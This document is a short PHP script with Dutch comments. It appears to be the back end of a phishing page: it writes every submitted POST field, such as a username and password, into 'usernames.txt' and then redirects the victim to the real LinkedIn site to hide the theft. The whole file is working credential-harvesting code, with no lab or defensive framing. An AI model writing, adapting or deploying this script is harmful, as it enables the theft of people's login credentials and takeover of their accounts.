<?php
// Redirect naar een nieuwe locatie
header('Location: https://www.linkedin.com/');

// Open het bestand 'usernames.txt' om gegevens toe te voegen
$handle = fopen("usernames.txt", "a");

// Loop door alle POST-variabelen en schrijf ze naar het bestand
foreach ($_POST as $variable => $value) {
    fwrite($handle, $variable . "=" . $value . "\r\n");
}

// Sluit het bestand
fclose($handle);

// Zorg ervoor dat de code na de redirect niet wordt uitgevoerd
exit;
?>
